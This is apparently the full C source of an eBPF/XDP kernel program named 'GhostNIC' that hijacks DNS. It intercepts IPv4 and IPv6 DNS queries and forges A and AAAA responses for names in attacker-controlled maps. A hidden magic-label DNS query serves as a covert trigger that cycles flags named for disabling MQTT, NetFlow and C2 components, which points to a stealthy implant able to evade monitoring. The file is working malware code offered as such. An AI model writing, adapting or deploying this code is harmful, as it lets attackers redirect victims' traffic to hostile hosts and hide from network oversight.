/* SPDX-License-Identifier: GPL-2.0 */
/*
 * GhostNIC XDP DNS hijacker.
 *
 * Intercepts IPv4/UDP and IPv6/UDP DNS queries on ingress.  When the queried
 * name matches an entry in the in-memory dns_targets (A) or dns6_targets
 * (AAAA) map, the original packet is rewritten in-place into a forged
 * response and transmitted back out via XDP_TX.
 */
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>
#include "common.h"

struct {
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 1024);
	__type(key, struct dns_key);
	__type(value, __u32);
} dns_targets SEC(".maps");

struct {
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 1024);
	__type(key, struct dns_key);
	__type(value, struct dns6_value);
} dns6_targets SEC(".maps");

struct {
	__uint(type, BPF_MAP_TYPE_ARRAY);
	__uint(max_entries, 1);
	__type(key, __u32);
	__type(value, __u8);
} control_flag SEC(".maps");

struct udp_pseudo_hdr {
	__u32 saddr;
	__u32 daddr;
	__u8  zero;
	__u8  protocol;
	__u16 len;
};

struct udp6_pseudo_hdr {
	__u8  saddr[16];
	__u8  daddr[16];
	__u32 len;
	__u8  zero[3];
	__u8  next_header;
};

static __always_inline __u16 csum_fold(__u32 csum)
{
	csum = (csum & 0xffff) + (csum >> 16);
	csum = (csum & 0xffff) + (csum >> 16);
	return (__u16)~csum;
}

static __always_inline __u16 csum_replace(__u16 old_csum, __u16 old_val,
					  __u16 new_val)
{
	__u32 sum = ~old_csum & 0xffff;
	sum += ~old_val & 0xffff;
	sum += new_val;
	return csum_fold(sum);
}

/*
 * Check whether the queried name starts with the magic "trigger" label.
 * If it matches, update the shared control_flag and return 1 so the caller
 * can drop the query without sending a forged response.
 */
static __always_inline int handle_control_query(struct dns_key *key)
{
	__u32 idx = 0;
	__u8 *flag;
	int i;

	if (key->name[0] != CTL_MAGIC_DNS_LEN)
		return 0;
	for (i = 0; i < CTL_MAGIC_DNS_LEN; i++) {
		if (key->name[1 + i] != ctl_magic_dns[i])
			return 0;
	}

	flag = bpf_map_lookup_elem(&control_flag, &idx);
	if (!flag)
		return 1;

	/* Cycle through bits 0-2 to demonstrate state changes. */
	if (*flag == 0)
		*flag = CTL_DISABLE_MQTT;
	else if (*flag == CTL_DISABLE_MQTT)
		*flag = CTL_DISABLE_NETFLOW;
	else if (*flag == CTL_DISABLE_NETFLOW)
		*flag = CTL_DISABLE_C2;
	else
		*flag = 0;
	bpf_map_update_elem(&control_flag, &idx, flag, BPF_ANY);
	return 1;
}

/*
 * Walk the DNS question name once, copying it into key, and return the QTYPE
 * pointer and value.  Combining the name walk with question parsing avoids a
 * second loop and keeps the verifier state space small.
 */
static __always_inline int parse_question(void *dns, void *dns_end,
					  struct dns_key *key,
					  void **qtype_ptr, __u16 *qtype)
{
	struct dns_hdr *hdr = dns;
	__u32 off = sizeof(struct dns_hdr);
	__u16 qclass;
	__u32 i;

	if (bpf_ntohs(hdr->qdcount) != 1 || bpf_ntohs(hdr->ancount) != 0)
		return -1;
	if ((hdr->flags & bpf_htons(0x8000)) != 0)
		return -1;

	for (i = 0; i < DNS_MAX_NAME; i++) {
		__u8 *c = dns + off + i;

		if ((void *)(c + 1) > dns_end)
			return -1;
		key->name[i] = *c;
		if (*c == 0) {
			off += i + 1;
			break;
		}
	}
	if (i == DNS_MAX_NAME)
		return -1;

	if ((void *)(dns + off + 4) > dns_end)
		return -1;
	*qtype = bpf_ntohs(*(__u16 *)(dns + off));
	qclass = bpf_ntohs(*(__u16 *)(dns + off + 2));
	if (qclass != 1)
		return -1;
	if (*qtype != 1 && *qtype != 28)
		return -1;
	*qtype_ptr = dns + off;
	return 0;
}

/*
 * Forge an IPv4/UDP DNS response (A record).  Returns XDP_TX on success.
 *
 * All pointers passed in are only used to read scalar values before the
 * packet is grown; after bpf_xdp_adjust_tail() the packet is re-parsed from
 * scratch so the verifier can track every access.
 */
static __always_inline int forge_response_v4(struct xdp_md *ctx,
					     struct iphdr *old_ip,
					     struct udphdr *old_udp,
					     __u32 answer_off,
					     __u32 new_ip)
{
	const __u32 answer_len = 16;
	void *data_end, *data;
	struct ethhdr *eth;
	struct iphdr *ip;
	struct udphdr *udp;
	void *dns;
	__u8 *answer;
	__u8 rec[16];
	__u16 old_ip_tot_len = bpf_ntohs(old_ip->tot_len);
	__u16 old_udp_len = bpf_ntohs(old_udp->len);
	__u16 old_sport = bpf_ntohs(old_udp->source);
	__u16 old_dport = bpf_ntohs(old_udp->dest);
	__u32 old_saddr = bpf_ntohl(old_ip->saddr);
	__u32 old_daddr = bpf_ntohl(old_ip->daddr);
	__u32 new_saddr = old_daddr;
	__u32 new_daddr = old_saddr;
	__u16 new_tot_len = old_ip_tot_len + answer_len;
	int i;

	/* Bound the variable answer offset so the verifier can track it. */
	if (answer_off > (DNS_MAX_NAME + sizeof(struct dns_hdr) + 4))
		return XDP_PASS;

	if (bpf_xdp_adjust_tail(ctx, answer_len) < 0)
		return XDP_PASS;

	data_end = (void *)(long)ctx->data_end;
	data = (void *)(long)ctx->data;

	eth = data;
	if ((void *)(eth + 1) > data_end)
		return XDP_PASS;

	ip = (void *)(eth + 1);
	if ((void *)(ip + 1) > data_end)
		return XDP_PASS;
	{
		__u32 ip_hlen = ip->ihl * 4;
		if (ip_hlen < sizeof(*ip))
			return XDP_PASS;
		udp = (void *)((__u8 *)ip + ip_hlen);
	}
	if ((void *)(udp + 1) > data_end)
		return XDP_PASS;

	dns = (void *)(udp + 1);
	if ((void *)((__u8 *)dns + sizeof(struct dns_hdr)) > data_end)
		return XDP_PASS;

	answer = (__u8 *)dns + answer_off;
	if ((void *)(answer + answer_len) > data_end)
		return XDP_PASS;

	rec[0] = 0xc0;
	rec[1] = sizeof(struct dns_hdr);
	rec[2] = 0x00; rec[3] = 0x01;  /* type A */
	rec[4] = 0x00; rec[5] = 0x01;  /* class IN */
	rec[6] = 0x00; rec[7] = 0x00;
	rec[8] = 0x01; rec[9] = 0x2c;  /* TTL 300 */
	rec[10] = 0x00; rec[11] = 0x04; /* rdlength 4 */
	rec[12] = (__u8)(new_ip >> 24);
	rec[13] = (__u8)(new_ip >> 16);
	rec[14] = (__u8)(new_ip >> 8);
	rec[15] = (__u8)new_ip;

	for (i = 0; i < 16; i++)
		answer[i] = rec[i];

	((struct dns_hdr *)dns)->flags = bpf_htons(0x8180);
	((struct dns_hdr *)dns)->ancount = bpf_htons(1);

	for (i = 0; i < ETH_ALEN; i++) {
		__u8 tmp = eth->h_source[i];
		eth->h_source[i] = eth->h_dest[i];
		eth->h_dest[i] = tmp;
	}

	ip->saddr = bpf_htonl(new_saddr);
	ip->daddr = bpf_htonl(new_daddr);
	ip->tot_len = bpf_htons(new_tot_len);
	ip->check = 0;
	{
		__u32 sum = 0;
		__u16 *w = (__u16 *)ip;
		if ((void *)(w + 10) > data_end)
			return XDP_PASS;
		sum += w[0]; sum += w[1]; sum += w[2]; sum += w[3]; sum += w[4];
		sum += w[5]; sum += w[6]; sum += w[7]; sum += w[8]; sum += w[9];
		sum = (sum & 0xffff) + (sum >> 16);
		sum = (sum & 0xffff) + (sum >> 16);
		ip->check = (__u16)~sum;
	}

	udp->source = bpf_htons(old_dport);
	udp->dest = bpf_htons(old_sport);
	udp->len = bpf_htons(old_udp_len + answer_len);
	udp->check = 0;

	return XDP_TX;
}

/*
 * Forge an IPv6/UDP DNS response (AAAA record).  Returns XDP_TX on success.
 */
static __always_inline int forge_response_v6(struct xdp_md *ctx,
					     struct ipv6hdr *old_ip6,
					     struct udphdr *old_udp,
					     __u32 answer_off,
					     struct dns6_value *new_ip)
{
	const __u32 answer_len = 28;
	void *data_end, *data;
	struct ethhdr *eth;
	struct ipv6hdr *ip6;
	struct udphdr *udp;
	void *dns;
	__u8 *answer;
	__u8 rec[28];
	__u16 old_udp_len = bpf_ntohs(old_udp->len);
	__u16 old_sport = bpf_ntohs(old_udp->source);
	__u16 old_dport = bpf_ntohs(old_udp->dest);
	__u16 old_payload_len = bpf_ntohs(old_ip6->payload_len);
	__u16 new_payload_len = old_payload_len + answer_len;
	int i;

	if (answer_off > (DNS_MAX_NAME + sizeof(struct dns_hdr) + 4))
		return XDP_PASS;

	if (bpf_xdp_adjust_tail(ctx, answer_len) < 0)
		return XDP_PASS;

	data_end = (void *)(long)ctx->data_end;
	data = (void *)(long)ctx->data;

	eth = data;
	if ((void *)(eth + 1) > data_end)
		return XDP_PASS;

	ip6 = (void *)(eth + 1);
	if ((void *)(ip6 + 1) > data_end)
		return XDP_PASS;

	udp = (void *)(ip6 + 1);
	if ((void *)(udp + 1) > data_end)
		return XDP_PASS;

	dns = (void *)(udp + 1);
	if ((void *)((__u8 *)dns + sizeof(struct dns_hdr)) > data_end)
		return XDP_PASS;

	answer = (__u8 *)dns + answer_off;
	if ((void *)(answer + answer_len) > data_end)
		return XDP_PASS;

	rec[0] = 0xc0;
	rec[1] = sizeof(struct dns_hdr);
	rec[2] = 0x00; rec[3] = 0x1c;  /* type AAAA */
	rec[4] = 0x00; rec[5] = 0x01;  /* class IN */
	rec[6] = 0x00; rec[7] = 0x00;
	rec[8] = 0x01; rec[9] = 0x2c;  /* TTL 300 */
	rec[10] = 0x00; rec[11] = 0x10; /* rdlength 16 */
	for (i = 0; i < 16; i++)
		rec[12 + i] = new_ip->addr[i];

	for (i = 0; i < 28; i++)
		answer[i] = rec[i];

	((struct dns_hdr *)dns)->flags = bpf_htons(0x8180);
	((struct dns_hdr *)dns)->ancount = bpf_htons(1);

	for (i = 0; i < ETH_ALEN; i++) {
		__u8 tmp = eth->h_source[i];
		eth->h_source[i] = eth->h_dest[i];
		eth->h_dest[i] = tmp;
	}

	for (i = 0; i < 16; i++) {
		__u8 tmp = ip6->saddr.in6_u.u6_addr8[i];
		ip6->saddr.in6_u.u6_addr8[i] = ip6->daddr.in6_u.u6_addr8[i];
		ip6->daddr.in6_u.u6_addr8[i] = tmp;
	}
	ip6->payload_len = bpf_htons(new_payload_len);

	udp->source = bpf_htons(old_dport);
	udp->dest = bpf_htons(old_sport);
	udp->len = bpf_htons(old_udp_len + answer_len);

	udp->check = csum_replace(
		csum_replace(
			csum_replace(udp->check,
				     bpf_htons(old_sport), bpf_htons(old_dport)),
			bpf_htons(old_dport), bpf_htons(old_sport)),
		bpf_htons(old_udp_len), udp->len);
	{
		__u32 sum = (~(__u32)udp->check) & 0xffff;
		__u32 answer_csum = bpf_csum_diff(0, 0, (__u32 *)rec, 28, 0);
		sum += answer_csum;
		sum = (sum & 0xffff) + (sum >> 16);
		sum = (sum & 0xffff) + (sum >> 16);
		udp->check = (__u16)~sum;
		if (udp->check == 0)
			udp->check = 0xffff;
	}

	return XDP_TX;
}

SEC("xdp/ghost_dns_hijack")
int ghost_dns_hijack(struct xdp_md *ctx)
{
	void *data_end = (void *)(long)ctx->data_end;
	void *data = (void *)(long)ctx->data;
	struct ethhdr *eth = data;
	struct dns_key key = {};
	void *qtype_ptr;
	__u16 qtype;
	void *dns;

	if ((void *)(eth + 1) > data_end)
		return XDP_PASS;

	if (eth->h_proto == bpf_htons(ETH_P_IP)) {
		struct iphdr *ip = (void *)(eth + 1);
		struct udphdr *udp;
		__u32 ip_hlen;
		__u32 *new_ip;

		if ((void *)(ip + 1) > data_end)
			return XDP_PASS;
		if (ip->protocol != IPPROTO_UDP)
			return XDP_PASS;
		ip_hlen = ip->ihl * 4;
		if (ip_hlen < sizeof(*ip))
			return XDP_PASS;
		udp = (void *)((__u8 *)ip + ip_hlen);
		if ((void *)(udp + 1) > data_end)
			return XDP_PASS;
		if (udp->dest != bpf_htons(53))
			return XDP_PASS;

		dns = (void *)(udp + 1);
		if ((void *)((__u8 *)dns + sizeof(struct dns_hdr)) > data_end)
			return XDP_PASS;
		if (parse_question(dns, data_end, &key, &qtype_ptr, &qtype) < 0)
			return XDP_PASS;
		if (handle_control_query(&key))
			return XDP_DROP;
		if (qtype != 1)
			return XDP_PASS;

		new_ip = bpf_map_lookup_elem(&dns_targets, &key);
		if (!new_ip)
			return XDP_PASS;
		{
			__u32 answer_off = (__u32)((__u8 *)qtype_ptr - (__u8 *)dns) + 4;
			return forge_response_v4(ctx, ip, udp, answer_off, *new_ip);
		}
	}

	if (eth->h_proto == bpf_htons(ETH_P_IPV6)) {
		struct ipv6hdr *ip6 = (void *)(eth + 1);
		struct udphdr *udp;
		struct dns6_value *new_ip6;

		if ((void *)(ip6 + 1) > data_end)
			return XDP_PASS;
		if (ip6->nexthdr != IPPROTO_UDP)
			return XDP_PASS;
		udp = (void *)(ip6 + 1);
		if ((void *)(udp + 1) > data_end)
			return XDP_PASS;
		if (udp->dest != bpf_htons(53))
			return XDP_PASS;

		dns = (void *)(udp + 1);
		if ((void *)((__u8 *)dns + sizeof(struct dns_hdr)) > data_end)
			return XDP_PASS;
		if (parse_question(dns, data_end, &key, &qtype_ptr, &qtype) < 0)
			return XDP_PASS;
		if (handle_control_query(&key))
			return XDP_DROP;
		if (qtype != 28)
			return XDP_PASS;

		new_ip6 = bpf_map_lookup_elem(&dns6_targets, &key);
		if (!new_ip6)
			return XDP_PASS;
		{
			__u32 answer_off = (__u32)((__u8 *)qtype_ptr - (__u8 *)dns) + 4;
			return forge_response_v6(ctx, ip6, udp, answer_off, new_ip6);
		}
	}

	return XDP_PASS;
}

char _license[] SEC("license") = "GPL";
